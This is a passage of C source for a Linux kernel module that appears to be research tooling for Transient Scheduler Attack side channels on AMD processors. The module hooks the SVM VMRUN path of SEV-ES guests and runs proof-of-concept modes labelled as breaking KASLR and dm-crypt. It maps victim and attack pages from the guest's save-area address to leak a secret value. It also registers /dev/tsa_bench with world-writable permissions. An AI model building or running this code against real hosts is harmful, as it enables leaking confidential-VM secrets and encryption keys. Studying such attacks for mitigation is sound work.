                u32 mit = mitigations[i];

                if (mit != TSA_MIT_NONE && ((args->mitigation_mask & mit) != mit))
                    continue;

                if (mit == TSA_MIT_L1D_FLUSH && !cpu_has_l1d_flush())
                    continue;

                tsa_run_metric_median_over_pmcs(args, 5, rep, victim, target, chase,
                                                times0, times1, default_samples, default_secret_bits,
                                                mit, TSA_ACCESS_VIRTUAL, TSA_NEG_NONE,
                                                NULL);
            }
        }
        pr_info("BMK,BENCH_END,run=%llu,bench=%d,bench_name=%s\n",
                (unsigned long long)args->run_id, 5, bench_name(5));
    }

    if (args->bench_mask & TSA_BENCH_6_NEGATIVE_CONTROLS) {
        static const u32 controls[] = {
            TSA_NEG_NO_TARGET_TLB_FLUSH,
            TSA_NEG_REP_MOVS,
            TSA_NEG_DIV_SQRT_PORT,
            TSA_NEG_VECTOR_MASKING,
            TSA_NEG_ADDRESS_TRANSLATION,
            TSA_NEG_STLF,
        };

        for (rep = 0; rep < repeats; rep++) {
            for (i = 0; i < ARRAY_SIZE(controls); i++) {
                u32 neg = controls[i];

                if (!(args->negative_mask & neg))
                    continue;

                tsa_run_metric_median_over_pmcs(args, 6, rep, victim, target, chase,
                                                times0, times1, default_samples, default_secret_bits,
                                                TSA_MIT_NONE, TSA_ACCESS_VIRTUAL, neg,
                                                NULL);
            }
        }
        pr_info("BMK,BENCH_END,run=%llu,bench=%d,bench_name=%s\n",
                (unsigned long long)args->run_id, 6, bench_name(6));
    }


    if(args->bench_mask & TSA_BENCH_7_VMRUN)
    {
        static const u32 poc_types[] = {
            TSA_ACCESS_VMRUN,
            TSA_BREAK_KASLR,
            TSA_BREAK_DM_CRYPT};

        for (i = 0; i < ARRAY_SIZE(poc_types); i++)
        {
            u32 access = poc_types[i];

            if (args->access_mask == TSA_ACCESS_VMRUN)
            {
                tsa_run_pmc_sweep_bench(args, 7, victim, target, chase, times0, times1, TSA_ACCESS_VMRUN);
            }
            else if (args->access_mask != access)
            {
                continue;
            }
            else
            {
                tsa_run_poc(args, 7, victim, target, chase, times0, times1, access);
            }
        }
            
        pr_info("BMK,BENCH_END,run=%llu,bench=%d,bench_name=%s\n",
                (unsigned long long)args->run_id, 7, bench_name(7));
        
        memcpy(svm_vmrun->current_vmcb->ptr, vmcb_save, PAGE_SIZE);
        unhook_vmrun();
    }

    pr_info("BMK,END,run=%llu\n", (unsigned long long)args->run_id);
}

static void __svm_sev_es_run_hook(struct vcpu_svm *svm, bool spec_ctrl_intercepted, struct sev_es_save_area *hostsa)
{
    
    struct tsa_bench_args *args = (struct tsa_bench_args *)tsa_bench_args;
    volatile uint8_t *victim;
    volatile uint8_t *attack;
    volatile uint8_t *chase_region = (volatile uint8_t *)CHASE_VA;
    volatile uint64_t *chase1, *chase2;
    uint64_t *times0 = NULL;
    uint64_t *times1 = NULL;

    svm_vmrun = svm;
    spec_ctrl_intercepted_vmrun = spec_ctrl_intercepted;
    hostsa_vmrun = hostsa;
    
    uint64_t mask =
    (1ULL << 13) | (1ULL << 26) |   
    (1ULL << 14) | (1ULL << 25);    

    PHYS_BASE = svm->vmcb->control.vmsa_pa;

    VICTIM_VA_PHYS = canonicalize_48(BASE_VA + PHYS_BASE);
    ATTACK_VA_PHYS = canonicalize_48((BASE_VA + PHYS_BASE) ^ mask);
    SECRET_VALUE = RAX_SECRET;

    map_physical_to_virtual(PHYS_RESERVED_BASE, VICTIM_VA_PHYS, 0);
    map_physical_to_virtual(PHYS_RESERVED_BASE + 0x200000, ATTACK_VA_PHYS, 0);

    victim = (volatile uint8_t *)VICTIM_VA_PHYS;
    attack = (volatile uint8_t *)ATTACK_VA_PHYS;

    map_physical_to_virtual(PHYS_RESERVED_BASE + 0x800000, CHASE_VA, 0);
    map_physical_to_virtual(PHYS_RESERVED_BASE + 0x801000, CHASE_VA + MAP_SIZE, 0);

    memset((void *)attack, 0xFF, MAP_SIZE);
    memset((void *)victim, 0x00, MAP_SIZE);

    chase1 = (uint64_t *)chase_region;
    chase2 = (uint64_t *)(chase_region + MAP_SIZE);

    *chase1 = (uint64_t)chase2;
    *chase2 = (uint64_t)chase1;

    times0 = vmalloc(MAX_SWEEP_PROBES * sizeof(uint64_t));
    times1 = vmalloc(MAX_SWEEP_PROBES * sizeof(uint64_t));

    if (!times0 || !times1) {
        pr_err("BMK,ERROR,run=%llu,reason=vmalloc_failed\n",
               (unsigned long long)args->run_id);
        goto out;
    }

    vmcb_save = kmalloc(PAGE_SIZE, GFP_KERNEL);
    if (!vmcb_save) {
        pr_err("BMK,ERROR,run=%llu,reason=vmcb_save_alloc_failed\n",
               (unsigned long long)args->run_id);
        goto out;
    }
    memcpy(vmcb_save, svm->current_vmcb->ptr, PAGE_SIZE);
    tsa_run_benchmarks(args, victim, attack, chase1, times0, times1);

out:
    disable_pmc();

    if (times0)
        vfree(times0);
    if (times1)
        vfree(times1);
    if (args)
        kfree(args);
    if (vmcb_save)
        kfree(vmcb_save);

    tsa_thread = NULL;

    module_put(THIS_MODULE);
}

static void __svm_sev_es_run_singlestep(void)
{
    struct tsa_bench_args *args = (struct tsa_bench_args *)tsa_bench_args;
    volatile uint8_t *victim;
    volatile uint8_t *attack;
    volatile uint8_t *chase_region = (volatile uint8_t *)CHASE_VA;
    volatile uint64_t *chase1, *chase2;
    uint64_t *times0 = NULL;
    uint64_t *times1 = NULL;

    svm_vmrun = svm_export;
    spec_ctrl_intercepted_vmrun = spec_ctrl_intercepted_export;
    hostsa_vmrun = sev_es_sa_export;
    
    uint64_t mask =
    (1ULL << 13) | (1ULL << 26) |   
    (1ULL << 14) | (1ULL << 25);    

    PHYS_BASE = svm_vmrun->vmcb->control.vmsa_pa;

    VICTIM_VA_PHYS = canonicalize_48(BASE_VA + PHYS_BASE);
    ATTACK_VA_PHYS = canonicalize_48((BASE_VA + PHYS_BASE) ^ mask);

    map_physical_to_virtual(PHYS_RESERVED_BASE, VICTIM_VA_PHYS, 0);
    map_physical_to_virtual(PHYS_RESERVED_BASE + 0x200000, ATTACK_VA_PHYS, 0);

    victim = (volatile uint8_t *)VICTIM_VA_PHYS;
    attack = (volatile uint8_t *)ATTACK_VA_PHYS;

    map_physical_to_virtual(PHYS_RESERVED_BASE + 0x800000, CHASE_VA, 0);
    map_physical_to_virtual(PHYS_RESERVED_BASE + 0x801000, CHASE_VA + MAP_SIZE, 0);

    memset((void *)attack, 0xFF, MAP_SIZE);
    memset((void *)victim, 0x00, MAP_SIZE);

    chase1 = (uint64_t *)chase_region;
    chase2 = (uint64_t *)(chase_region + MAP_SIZE);

    *chase1 = (uint64_t)chase2;
    *chase2 = (uint64_t)chase1;

    times0 = vmalloc(MAX_SWEEP_PROBES * sizeof(uint64_t));
    times1 = vmalloc(MAX_SWEEP_PROBES * sizeof(uint64_t));

    if (!times0 || !times1) {
        pr_err("BMK,ERROR,run=%llu,reason=vmalloc_failed\n",
               (unsigned long long)args->run_id);
        goto out;
    }

    vmcb_save = kmalloc(PAGE_SIZE, GFP_KERNEL);
    if (!vmcb_save) {
        pr_err("BMK,ERROR,run=%llu,reason=vmcb_save_alloc_failed\n",
               (unsigned long long)args->run_id);
        goto out;
    }
    memcpy(vmcb_save, svm_vmrun->current_vmcb->ptr, PAGE_SIZE);
    args->bench_mask = TSA_BENCH_7_VMRUN;
    tsa_run_benchmarks(args, victim, attack, chase1, times0, times1);

    if(args->access_mask & TSA_BREAK_DM_CRYPT)
    {
        dm_crypt_round = !dm_crypt_round;
    }

out:
    disable_pmc();

    if (times0)
        vfree(times0);
    if (times1)
        vfree(times1);
    if (vmcb_save)
        kfree(vmcb_save);

    tsa_thread = NULL;
}

/* ------------------------------------------------------------------ */
/* Main Kernel Thread Wrapper                                         */
/* ------------------------------------------------------------------ */
static int kthread_tsa_main(void *data)
{
    struct tsa_bench_args *args = data;
    volatile uint8_t *victim = (volatile uint8_t *)VICTIM_VA;
    volatile uint8_t *attack = (volatile uint8_t *)ATTACK_VA;
    volatile uint8_t *chase_region = (volatile uint8_t *)CHASE_VA;
    volatile uint64_t *chase1, *chase2;
    uint64_t *times0 = NULL;
    uint64_t *times1 = NULL;
    int ret = 0;

    if (!args) {
        pr_err("BMK,ERROR,reason=missing_args\n");
        ret = -EINVAL;
        goto out;
    }

    pr_info("============================================================\n");
    pr_info("  TSA-L1 Benchmark Module: ioctl run\n");
    pr_info("  Filtering: Otsu threshold + majority vote\n");
    pr_info("============================================================\n");

    pr_info("[+] Mapping Virtual Addresses to Physical Base: 0x%llx\n",
            (unsigned long long)PHYS_RESERVED_BASE);

    if (args->bench_mask & TSA_BENCH_7_VMRUN)
    {
        hook_vmrun(data, __svm_sev_es_run_hook);
        return 0;
    }
    
    if(args->bench_mask & TSA_BENCH_8_SINGLSTEP)
    {
        enable_singlestep(data, __svm_sev_es_run_singlestep);
        return 0;
    }

    if (args->bench_mask & TSA_BENCH_4_VIRT_VS_PHYS)
    {
        tsa_setup_physical_address();
        if (!PHYS_BASE)
        {
            pr_err("BMK,ERROR,reason=physical_address_setup_failed\n");
            ret = -EFAULT;
            goto out;
        }

        map_physical_to_virtual(PHYS_RESERVED_BASE, VICTIM_VA_PHYS, 0);
        map_physical_to_virtual(PHYS_RESERVED_BASE + 0x200000, ATTACK_VA_PHYS, 0);

        victim = (volatile uint8_t *)VICTIM_VA_PHYS;
        attack = (volatile uint8_t *)ATTACK_VA_PHYS;
    }
    else
    {
        map_physical_to_virtual(PHYS_RESERVED_BASE, VICTIM_VA, 0);
        map_physical_to_virtual(PHYS_RESERVED_BASE + 0x200000, ATTACK_VA, 0);
    }

    map_physical_to_virtual(PHYS_RESERVED_BASE + 0x800000, CHASE_VA, 0);
    map_physical_to_virtual(PHYS_RESERVED_BASE + 0x801000, CHASE_VA + MAP_SIZE, 0);

    memset((void *)attack, 0xFF, MAP_SIZE);
    memset((void *)victim, 0x00, MAP_SIZE);

    chase1 = (uint64_t *)chase_region;
    chase2 = (uint64_t *)(chase_region + MAP_SIZE);

    *chase1 = (uint64_t)chase2;
    *chase2 = (uint64_t)chase1;

    times0 = vmalloc(MAX_SWEEP_PROBES * sizeof(uint64_t));
    times1 = vmalloc(MAX_SWEEP_PROBES * sizeof(uint64_t));

    if (!times0 || !times1) {
        pr_err("BMK,ERROR,run=%llu,reason=vmalloc_failed\n",
               (unsigned long long)args->run_id);
        ret = -ENOMEM;
        goto out;
    }

    tsa_run_benchmarks(args, victim, attack, chase1, times0, times1);

out:
    disable_pmc();

    if(args->bench_mask & TSA_BENCH_4_VIRT_VS_PHYS)
        tsa_cleanup_physical_address();
    if (times0)
        vfree(times0);
    if (times1)
        vfree(times1);
    if (args)
        kfree(args);

    tsa_thread = NULL;

    module_put(THIS_MODULE);
    return ret;
}

/* ------------------------------------------------------------------ */
/* ioctl / misc device                                                */
/* ------------------------------------------------------------------ */
static void tsa_normalize_args(struct tsa_bench_args *args)
{
    if (!args->run_id)
        args->run_id = ktime_get_ns();

    if (!args->bench_mask)
        args->bench_mask = TSA_BENCH_1_ACCURACY_VS_SAMPLES;

    if (!args->repeats)
        args->repeats = 1;

    if (args->repeats > 100)
        args->repeats = 100;

    if (!args->default_samples)
        args->default_samples = DEFAULT_SWEEP_PROBES;

    if (args->default_samples > MAX_SWEEP_PROBES)
        args->default_samples = MAX_SWEEP_PROBES;

    if (!args->default_secret_bits)
        args->default_secret_bits = DEFAULT_SECRET_BITS;

    if (args->default_secret_bits > MAX_SECRET_BITS)
        args->default_secret_bits = MAX_SECRET_BITS;

    if (args->default_event > 0xfff)
        args->default_event = DEFAULT_EVENT;

    if (!args->accuracy_threshold_permille)
        args->accuracy_threshold_permille = DEFAULT_ACCURACY_THRESHOLD_PERMILLE;

    if (args->n_samples > TSA_BENCH_MAX_LIST)
        args->n_samples = TSA_BENCH_MAX_LIST;

    if (args->n_secret_bits > TSA_BENCH_MAX_LIST)
        args->n_secret_bits = TSA_BENCH_MAX_LIST;

    if (!args->n_samples) {
        static const u32 defaults[] = {1, 2, 4, 8, 16, 32, 50, 64, 100, 128, 256, 512};
        int i;

        args->n_samples = ARRAY_SIZE(defaults);
        for (i = 0; i < ARRAY_SIZE(defaults); i++)
            args->samples[i] = defaults[i];
    }

    if (!args->n_secret_bits) {
        static const u32 defaults[] = {32, 64, 128, 256, 512};
        int i;

        args->n_secret_bits = ARRAY_SIZE(defaults);
        for (i = 0; i < ARRAY_SIZE(defaults); i++)
            args->secret_bits[i] = defaults[i];
    }

    if (!args->access_mask)
        args->access_mask = TSA_ACCESS_VIRTUAL;

    if (!args->mitigation_mask)
        args->mitigation_mask = TSA_MIT_VERW | TSA_MIT_WBINVD | TSA_MIT_L1D_FLUSH | TSA_MIT_CFLUSH;

    if (!args->negative_mask)
        args->negative_mask = TSA_NEG_NO_TARGET_TLB_FLUSH |
                              TSA_NEG_REP_MOVS |
                              TSA_NEG_DIV_SQRT_PORT |
                              TSA_NEG_VECTOR_MASKING |
                              TSA_NEG_ADDRESS_TRANSLATION |
                              TSA_NEG_STLF;
}

static long tsa_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    struct tsa_bench_args *args;
    struct task_struct *thread;

    if (cmd != TSA_IOCTL_START_BENCH)
        return -ENOTTY;

    args = kzalloc(sizeof(*args), GFP_KERNEL);
    if (!args)
        return -ENOMEM;

    if (copy_from_user(args, (void __user *)arg, sizeof(*args))) {
        kfree(args);
        return -EFAULT;
    }

    tsa_normalize_args(args);

    if (tsa_thread) {
        kfree(args);
        return -EBUSY;
    }

    if (!try_module_get(THIS_MODULE)) {
        kfree(args);
        return -ENODEV;
    }

    pr_info("BMK,IOCTL,run=%llu,bench_mask=0x%x,repeats=%u\n",
            (unsigned long long)args->run_id, args->bench_mask, args->repeats);

    thread = kthread_create(kthread_tsa_main, args, "tsa_bench_worker");
    if (IS_ERR(thread)) {
        int ret = PTR_ERR(thread);

        module_put(THIS_MODULE);
        kfree(args);
        return ret;
    }

    tsa_thread = thread;
    kthread_bind(thread, 0);
    wake_up_process(thread);

    return 0;
}

static const struct file_operations tsa_fops = {
    .owner          = THIS_MODULE,
    .unlocked_ioctl = tsa_ioctl,
#ifdef CONFIG_COMPAT
    .compat_ioctl   = tsa_ioctl,
#endif
};

static struct miscdevice tsa_miscdev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name  = "tsa_bench",
    .fops  = &tsa_fops,
    .mode  = 0666,
};

/* ------------------------------------------------------------------ */
/* Module init / exit                                                 */
/* ------------------------------------------------------------------ */
static int __init tsa_init(void)
{
    int ret;

    pr_info("TSA-L1 benchmark module loaded\n");

    ret = misc_register(&tsa_miscdev);
    if (ret) {
        pr_err("misc_register failed: %d\n", ret);
        return ret;
    }

    pr_info("TSA benchmark ioctl device ready: /dev/tsa_bench\n");
    return 0;
}

static void __exit tsa_exit(void)
{
    pr_info("TSA-L1 benchmark module unloading\n");
    misc_deregister(&tsa_miscdev);
    pr_info("TSA-L1 benchmark module unloaded\n");
}

module_init(tsa_init);
module_exit(tsa_exit);
